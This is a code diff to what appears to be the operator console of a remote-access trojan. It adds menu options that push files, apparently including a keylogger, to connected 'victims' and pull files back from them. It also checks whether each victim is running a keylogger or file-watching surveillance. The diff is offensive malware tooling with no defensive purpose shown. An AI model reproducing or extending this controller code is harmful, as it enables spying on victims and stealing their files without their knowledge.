@@ -63,11 +63,89 @@ if __name__ == '__main__':
                 if command == constants.PERFORM_MENU_ITEM_FIVE:
                     disconnect_from_client(sockets_to_read, connected_clients)
 
+# MENU ITEM 6 - Transfer a file to victim
+                if command == constants.PERFORM_MENU_ITEM_SIX:
+                    # CASE 1: Check if client list is empty
+                    if len(connected_clients) == constants.ZERO:
+                        print(constants.TRANSFER_FILE_NO_CLIENT_ERROR)
+
+                    # CASE 2: Handle single client in client list
+                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))
+
+                        # Check if target socket is currently running keylogger
+                        if is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+
+                        # Check if file/directory watching
+                        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+                        else:
+                            transfer_file(client_socket, client_ip, client_port)
+
+                    # CASE 3: Send keylogger to any specific connected victim
+                    elif len(connected_clients) != constants.ZERO:
+                        target_ip = input(constants.TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT)
+                        target_port = int(input(constants.TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT))
+                        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(
+                            connected_clients,
+                            target_ip,
+                            target_port)
+
+                        # Check if target socket is currently running keylogger
+                        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+
+                        # Check if file/directory watching
+                        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+
+                        if target_socket:
+                            transfer_file(target_socket, target_ip, target_port)
+                        else:
+                            print(constants.TARGET_VICTIM_NOT_FOUND)
+
+# MENU ITEM 7 - Get File from Victim
+                if command == constants.PERFORM_MENU_ITEM_SEVEN:
+                    # CASE 1: Check if client list is empty
+                    if len(connected_clients) == constants.ZERO:
+                        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
+
+                    # CASE 2: Handle single client in client list
+                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))
+
+                        # Check status
+                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+                        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+                            # return None
+                        else:
+                            receive_file(client_socket, client_ip, client_port)
+
                 # MENU ITEM 9 - Watch File
                 if command == constants.PERFORM_MENU_ITEM_NINE:
                     global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue)
 
-                # MENU ITEM 10 - Watch Directory
+# MENU ITEM 10 - Watch Directory
                 # 1) If the file is ADDED (in directories), store it in the
                 #    ip-based directory of commander
 
